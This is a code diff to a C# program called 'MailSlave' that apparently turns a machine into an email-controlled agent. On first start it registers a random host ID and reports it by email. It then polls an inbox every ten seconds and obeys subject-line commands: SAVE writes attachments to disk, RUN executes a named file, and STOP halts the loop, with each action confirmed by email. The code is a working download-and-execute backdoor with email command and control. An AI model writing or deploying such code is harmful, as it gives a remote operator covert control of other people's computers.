@@ -8,6 +8,7 @@ using MailKit.Search;
 
 using System.IO;
 using System.Diagnostics;
+using System.Threading;
 
 namespace MailSlave
 {
@@ -28,9 +29,26 @@ namespace MailSlave
 		private static string TO_NAME = Properties.Resources.TO_NAME;
 		private static string TO_ADDRESS = Properties.Resources.TO_ADDRESS;
 
+		private static string HOST_ID = Properties.Settings.Default.hostID;
+
+		private static bool whileShouldBeRunning = true;
 
 		static void Main(string[] args)
 		{
+			//Properties.Settings.Default.firstStart = true;
+			//Properties.Settings.Default.Save();
+
+			if (Properties.Settings.Default.firstStart)
+			{
+				Properties.Settings.Default.firstStart = false;
+				Properties.Settings.Default.hostID = Guid.NewGuid().ToString();
+				Properties.Settings.Default.Save();
+
+				HOST_ID = Properties.Settings.Default.hostID;
+
+				sendMail($"Host started. Host ID: {HOST_ID}");
+			}
+
 			ImapClient client = new ImapClient();
 
 			client.Connect(IMAP_SERVER_ADDRESS, IMAP_PORT_NUMBER, true);
@@ -38,44 +56,57 @@ namespace MailSlave
 
 			client.Inbox.Open(FolderAccess.ReadWrite);
 
-			foreach (var uid in client.Inbox.Search(SearchQuery.NotSeen))
+			while (whileShouldBeRunning)
 			{
-				var message = client.Inbox.GetMessage(uid);
-				Console.WriteLine(message.Subject); // to delete
-
-				if (message.Subject.Contains("SAVE"))
+				foreach (var uid in client.Inbox.Search(SearchQuery.NotSeen))
 				{
-					client.Inbox.AddFlags(uid, MessageFlags.Seen, true);
+					var message = client.Inbox.GetMessage(uid);
 
-					string[] messageSubjectData = message.Subject.Split('#');
-
-					foreach (var attachment in message.Attachments)
+					if (message.Subject.Contains(HOST_ID + '#'))
 					{
-						Stream stream = File.Create(messageSubjectData[1]);
+						client.Inbox.AddFlags(uid, MessageFlags.Seen, true);
 
-						if (attachment is MessagePart)
+						string command = message.Subject.Split('#')[1];
+						string appName = message.Subject.Split('#')[2];
+
+						if (command.Equals("SAVE"))
 						{
-							MessagePart messagePart = (MessagePart)attachment;
-							messagePart.Message.WriteTo(stream);
+							foreach (var attachment in message.Attachments)
+							{
+								Stream stream = File.Create(appName);
+
+								if (attachment is MessagePart)
+								{
+									MessagePart messagePart = (MessagePart)attachment;
+									messagePart.Message.WriteTo(stream);
+								}
+								else
+								{
+									MimePart mimePart = (MimePart)attachment;
+									mimePart.Content.DecodeTo(stream);
+								}
+							}
+							sendMail($"Host ID: {HOST_ID}. The attachment {appName} was saved correctly.");
 						}
-						else
+
+						if (command.Equals("RUN"))
 						{
-							MimePart mimePart = (MimePart)attachment;
-							mimePart.Content.DecodeTo(stream);
+							Process.Start(appName);
+
+							sendMail($"Host ID: {HOST_ID}. The app {appName} has started.");
+						}
+
+						if (command.Equals("STOP"))
+						{
+							if (appName.Equals("SELF"))
+							{
+								whileShouldBeRunning = false;
+							}
+							sendMail($"Host ID: {HOST_ID}. The host has been stopped.");
 						}
 					}
-					sendMail($"The attachment {messageSubjectData[1]} was saved correctly");
 				}
-
-				if (message.Subject.Contains("RUN"))
-				{
-					string[] messageSubjectData = message.Subject.Split('#');
-
-					client.Inbox.AddFlags(uid, MessageFlags.Seen, true);
-					Process.Start(messageSubjectData[1]);
-
-					sendMail($"The app {messageSubjectData[1]} has started");
-				}
+				Thread.Sleep(10000);
 			}
 			client.Disconnect(true);
 		}
